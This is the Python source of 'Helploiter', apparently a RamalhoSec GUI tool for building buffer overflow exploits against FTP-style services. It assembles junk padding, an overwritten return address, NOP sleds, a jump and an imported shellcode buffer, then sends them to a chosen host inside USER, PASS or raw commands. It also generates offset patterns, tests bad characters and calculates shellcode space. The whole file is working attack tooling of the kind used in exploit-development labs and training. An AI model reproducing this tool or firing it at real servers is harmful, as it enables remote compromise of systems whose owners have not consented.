#!/usr/bin/python
import sys
import socket
import string
import os,sys
from os import *
from sys import *
from os import *
from Tkinter import *
from tkinter import *
from especialfuncs import *
import badchanged
from badchanged import stringchars, jmp, buf


#BEGIN GLOBAL VARIABLES:
rhost = ""
rport = 0
rlogin = "Anonymous"
rpass = ""
xcount = 0
ycount = 0

eip = "\x42\x42\x42\x42"
#END GLOBAL VARIABLES


root = Tk()#Call Tkinter Gui

#Main frame with main text:
mainframe = LabelFrame(root, text="Welcome to Helploiter - Tool to help create your exploits - Created by RamalhoSec Team")
mainframe.pack(fill="both")
############################################################################



#BEGIN CHECKOPTIONS:
def loginatc():
    if Logincheck.get() == 1:
        passcheckop.configure(state=DISABLED)
        portcheckop.configure(state=DISABLED)
        #helpcheckop.configure(state=DISABLED)
        
    else:
        passcheckop.configure(state=NORMAL)
        portcheckop.configure(state=NORMAL)
        #helpcheckop.configure(state=NORMAL)
        
Logincheck = IntVar()
logincheckop = Checkbutton(mainframe, text="Enable Login Attackmod", variable=Logincheck, command=loginatc)
logincheckop.grid(row=1, column=1)


def passatc():
    if Passcheck.get() == 1:
        logincheckop.configure(state=DISABLED)
        portcheckop.configure(state=DISABLED)
        #helpcheckop.configure(state=DISABLED)
        
    else:
        logincheckop.configure(state=NORMAL)
        portcheckop.configure(state=NORMAL)
        #helpcheckop.configure(state=NORMAL)
        
Passcheck = IntVar()
passcheckop = Checkbutton(mainframe, text="Enable Pass Attackmod", variable=Passcheck, command=passatc)
passcheckop.grid(row=1, column=2)

def portatc():
    if Portcheck.get() == 1:
        logincheckop.configure(state=DISABLED)
        #helpcheckop.configure(state=DISABLED)
        passcheckop.configure(state=DISABLED)
    else:
        logincheckop.configure(state=NORMAL)
        #helpcheckop.configure(state=NORMAL)
        passcheckop.configure(state=NORMAL)
        
Portcheck = IntVar()
portcheckop = Checkbutton(mainframe, text="Enable Port Attackmod", variable=Portcheck, command=portatc)
portcheckop.grid(row=1, column=3)



     
        
Helpcheck = IntVar()
helpcheckop = Checkbutton(mainframe, text="Enable Help Attackmod", variable=Helpcheck, onvalue=1, offvalue=0)
helpcheckop.grid(row=1, column=4)


Pattcheck = IntVar()
pattcheckop = Checkbutton(mainframe, text="Enable Pattern Attackmod", variable=Pattcheck, onvalue=1, offvalue=0)
pattcheckop.grid(row=1, column=5)
#END CHECKOPTIONS

#BEGIN MULTIPILERS:
junklabel = Label(mainframe, text="Junk:").grid(row=1, column=6)
junkmultipiler = Spinbox(mainframe, from_=0, to=100000, width=4)
junkmultipiler.grid(row=1, column=7)

pattlabel = Label(mainframe, text="Pattern:").grid(row=1, column=8)
pattmultipiler = Spinbox(mainframe, from_=0, to=1000, width=4)
pattmultipiler.grid(row=1, column=9)
#END MULTIPILERS

#Second frame with  text:
secondframe = LabelFrame(root, text="-Define remote target informations:", bd=0, padx=5, pady=5)
secondframe.pack(fill="both")
############################################################################

#BEGIN RHOST LABEL and ENRTY:
remotehl = Label(secondframe, text="RHOST").pack(side=LEFT)
remoterh = Entry(secondframe)
remoterh.pack(side=LEFT)

remotepl = Label(secondframe, text="  RPORT").pack(side=LEFT)
remoterp = Entry(secondframe, width=4)
remoterp.pack(side=LEFT)

remotell = Label(secondframe, text="  RLOGIN").pack(side=LEFT)
remoterl = Entry(secondframe, width=13)
remoterl.pack(side=LEFT)

remotesl = Label(secondframe, text="  RPASS").pack(side=LEFT)
remoters = Entry(secondframe, width=13)
remoters.pack(side=LEFT)
#END RHOST LABEL and ENTRY

####################################################################################################################################################
#BEGIN BUTTON EXPLOIT AND STOP:
def exploitbt():
    rhost = remoterh.get()
    rport = remoterp.get()
    rlogin = remoterl.get()
    rpass = remoters.get()
    junk = "\x41"*int(junkmultipiler.get())
    sccalc = "\x43"*int(junkmultipiler.get())*2
    nops = "\x90"*int(nopsmultipiler.get())
    pattern = pattern_gen(int(junkmultipiler.get()))
    exploit = junk + eip
    
    
    if Pattcheck.get() == 1:
        exploit = pattern
        statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
    else:
        pass
    
    if Sspacecheck.get() == 1:
        exploit = junk + eip + sccalc
        statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
    else:
        pass
    
    if Badcharcheck.get() == 1:
        reload(badchanged)
        from badchanged import stringchars, jmp, buf
        defaultbadchars = badcharacters.get("1.0",END)
        writebadchars(defaultbadchars)
        reload(badchanged)
        exploit = junk + eip + stringchars
        statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
    else:
        pass


    if Randomcheck.get() == 1:
        mtpjunk = int(junkmultipiler.get())
        for number in range(0, mtpjunk, 1):
            number = number + 1
            junk = "\x41" * number
            statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
            #print(len(junk))
            #print(junk)
            print("STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
        else:
            pass
    else:
        pass
    

    if Paylodcheck.get() == 1:
        reload(badchanged)
        from badchanged import stringchars, jmp, buf
        defaultbadchars = badcharacters.get("1.0",END)
        writebadchars(defaultbadchars)
        reload(badchanged)
        exploit = junk + jmp + nops + buf
        statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
    else:
        pass
    
    
    if Logincheck.get() == 1:
        net = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        net.connect((rhost ,int(rport)))
        net.recv(1024)
        net.send('USER '+exploit+'\r\n')
        statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")

    elif Passcheck.get() == 1:
        net = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        net.connect((rhost ,int(rport)))
        net.recv(1024)
        if Helpcheck.get() == 1:
            net.send('USER '+rlogin+'\r\n')
            net.send('PASS '+exploit+'\r\n')
            statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
        else:
            net.send('USER Anonymous\r\n')
            net.send('PASS '+exploit+'\r\n')
            statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
        
    elif Portcheck.get() == 1:
        net = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        net.connect((rhost ,int(rport)))
        net.recv(1024)
        if Helpcheck.get() == 1:
            net.send('USER '+rlogin+'\r\n')
            net.send('PASS '+rpass+'\r\n')
            net.send(exploit+'\r\n')
            statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
        else:
            net.send('USER Anonymous\r\n')
            net.send('PASS \r\n')
            net.send(exploit+'\r\n')
            statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
    else:
        pass
    
    
    
    
#exploitbl = Label(secondframe).pack(side=LEFT)
exploitbt = Button(secondframe, text="exploit!", command=exploitbt)
exploitbt.pack(side=LEFT)

def reloadbt():
    from especialfuncs import *
    from badedit import *
    import badchanged
    from badchanged import stringchars, jmp, buf
    
    

#closebl = Label(secondframe).pack(side=LEFT)
reloadbt = Button(secondframe, text="RELOAD!", command=reloadbt)
reloadbt.pack(side=LEFT)

statuslabel = Label(secondframe, text="STATUS: [+] Send payload with  0  bytes.")
statuslabel.pack(side=LEFT)
#END BUTTON EXPLOIT AND STOP
#######################################################################################################################################################

#BEGIN THE ATTACK STATUS:

#END THE ATTACK STATUS



#Setting frame with text
settingframe = LabelFrame(root, text="Settings of exploit:", padx=5, pady=5)
settingframe.pack(fill="both")
############################################################################

#NEW CHECK OPTIONS:
Randomcheck = IntVar()
randomcheckop = Checkbutton(settingframe, text="Enable Random junk Attackmod", variable=Randomcheck)
randomcheckop.grid(row=1, column=1)
#END NEW CHECK OPTIONS

#BEGIN NOPS MULTIPILEROPS:
nopslabel = Label(settingframe, text="Nops:").grid(row=1, column=2)
nopsmultipiler = Spinbox(settingframe, from_=0, to=100000, width=3)
nopsmultipiler.grid(row=1, column=3)

sspacelabel = Label(settingframe, text="Payload space:").grid(row=1, column=4)
sspacemultipiler = Spinbox(settingframe, from_=0, to=100000, width=3)
sspacemultipiler.grid(row=1, column=5)
#END NOPS MULTIPILER OPS

#BEGIN PATTERN HEX or ASCII SEARCH:
separador = Label(settingframe, text="      ").grid(row=1, column=6)
patlabel = Label(settingframe, text="Pattern location: ").grid(row=1, column=7)

pattext = Entry(settingframe, width=5)
pattext.grid(row=1, column=8)

def searchpatt():
    var = pattext.get()
    var = var[::-1]
    pattresult = pattern_search(var)
    result.configure(text="  Pattern "+var+" first occurrence at position "+str(pattresult)+" in pattern!")
    
separador = Label(settingframe, text="    ").grid(row=1, column=9)
searchbt = Button(settingframe, text="Search!", command=searchpatt)
searchbt.grid(row=1, column=10)

result = Label(settingframe, text="Result will be out here!")
result.grid(row=1, column=11)
#END PATTERN HEX OR ASCII SEARCH

#Tools frame with text
toolsframe = LabelFrame(root, text="Calculator Tools:", padx=5, pady=5)
toolsframe.pack(fill="both")
############################################################################


#BEGIN HEX TO ASCII - ASCII TO HEX
Label(toolsframe, text="Hex TO Ascii or Ascii TO Hex").grid(row=1, column=1)

def hxconv():
    if Hexcheck.get() == 1:
        asciicheckop.configure(state=DISABLED)
    else:
        asciicheckop.configure(state=NORMAL)
        
Hexcheck = IntVar()
hexcheckop = Checkbutton(toolsframe, text="HEX", variable=Hexcheck, command=hxconv)
hexcheckop.grid(row=1, column=2)


def asconv():
    if Asciicheck.get() == 1:
        hexcheckop.configure(state=DISABLED)
    else:
        hexcheckop.configure(state=NORMAL)
        
Asciicheck = IntVar()
asciicheckop = Checkbutton(toolsframe, text="ASCII", variable=Asciicheck, command=asconv)
asciicheckop.grid(row=1, column=3)

convert = Entry(toolsframe, width=13)
convert.grid(row=1, column=4)

def convertnow():
    if Hexcheck.get() == 1:
        convertresult.configure(text="The code:     "+(str(convert.get())).decode("hex"))
    elif Asciicheck.get() == 1:
        convertresult.configure(text="The code:     "+(str(convert.get())).encode("hex"))
        
separador = Label(toolsframe, text="  ").grid(row=1, column=5)
convertbtl = Button(toolsframe, text="Convert!", command=convertnow)
convertbtl.grid(row=1, column=6)

convertresult = Label(toolsframe, text="The code:         ")
convertresult.grid(row=1, column=8)
#END BEGIN HEX TO ASCII - ASCII TO HEX

#BEGIN OF HEX CALC

def calcyxdata():
    xdhex = xdatahex.get()
    xdhex = int(xdhex, 0)
    ydhex = ydatahex.get()
    ydhex = int(ydhex, 0)
    xyhex = ydhex - xdhex

    yxdatalabel.configure(text="   Space:  "+(str(xyhex)))
    


separador = Label(toolsframe, text="  ").grid(row=1, column=9)
hexcalcbtl = Button(toolsframe, text="Calc!", command=calcyxdata)
hexcalcbtl.grid(row=1, column=10)

xdatalabel = Label(toolsframe, text="  Hex: ").grid(row=1, column=11)
xdatahex = Entry(toolsframe, width=12)
xdatahex.grid(row=1, column=12)
datalabel = Label(toolsframe, text="  ( - )").grid(row=1, column=13)
ydatalabel = Label(toolsframe, text="  Hex: ").grid(row=1, column=14)
ydatahex = Entry(toolsframe, width=12)
ydatahex.grid(row=1, column=15)

yxdatalabel = Label(toolsframe, text="   Space:  ")
yxdatalabel.grid(row=1, column=16)


#END OF HEX CALC



############################################################################
#END PAYLOD EDIT

#Payload and badchars with text
finalframe = LabelFrame(root, text="-Payload and Badchars:", padx=5, pady=5, bd=0)
finalframe.pack(fill="both")
############################################################################

#BEGIN BADCHAR EDIT:
Label(finalframe, text="Select to send:").grid(row=1,column=3)

def payloadbufsend():
    if Paylodcheck.get() == 1:
        badcharacters.insert("1.0", badread)
        pattcheckop.configure(state=DISABLED)
        randomcheckop.configure(state=DISABLED)
        badcharcheckop.configure(state=DISABLED)
        sspacecheckop.configure(state=DISABLED)
    else:
        badcharacters.delete("1.0", END)
        pattcheckop.configure(state=NORMAL)
        randomcheckop.configure(state=NORMAL)
        badcharcheckop.configure(state=NORMAL)
        sspacecheckop.configure(state=NORMAL)

Paylodcheck = IntVar()
paylodcheckop = Checkbutton(finalframe, text="Payload!", variable=Paylodcheck, command=payloadbufsend)
paylodcheckop.grid(row=1, column=4)

def badcharsend():
    badcharacters.insert("1.0", badread)
    if Badcharcheck.get() == 1:
        pattcheckop.configure(state=DISABLED)
        randomcheckop.configure(state=DISABLED)
        paylodcheckop.configure(state=DISABLED)
        sspacecheckop.configure(state=DISABLED)
    else:
        badcharacters.delete("1.0", END)
        pattcheckop.configure(state=NORMAL)
        randomcheckop.configure(state=NORMAL)
        paylodcheckop.configure(state=NORMAL)
        sspacecheckop.configure(state=NORMAL)
        
        

Badcharcheck = IntVar()
badcharcheckop = Checkbutton(finalframe, text="Badchars!", variable=Badcharcheck, command=badcharsend)
badcharcheckop.grid(row=1, column=5)

def sspacecalcsend():
    if Sspacecheck.get() == 1:
        pattcheckop.configure(state=DISABLED)
        randomcheckop.configure(state=DISABLED)
        paylodcheckop.configure(state=DISABLED)
        badcharcheckop.configure(state=DISABLED)
    else:
        pattcheckop.configure(state=NORMAL)
        randomcheckop.configure(state=NORMAL)
        paylodcheckop.configure(state=NORMAL)
        badcharcheckop.configure(state=NORMAL)

Sspacecheck = IntVar()
sspacecheckop = Checkbutton(finalframe, text="Shell space calculator!", variable=Sspacecheck, command=sspacecalcsend)
sspacecheckop.grid(row=1, column=6)
#END BADCHAR EDIT

#Payload and badchars with text
ultimframe = LabelFrame(root, text="Payload and Badchars edit:", padx=5, pady=5)
ultimframe.pack(fill="both",expand="yes")

badcharacters = Text(ultimframe, height=18, width=114)
badcharacters.pack()
############################################################################





root.title("Helploiter - RamalhoSec 0x01")#Gui window title
root.resizable(width="FALSE", height="FALSE")#Don't resize window
root.geometry("932x580")#Define de window resize
root.mainloop()
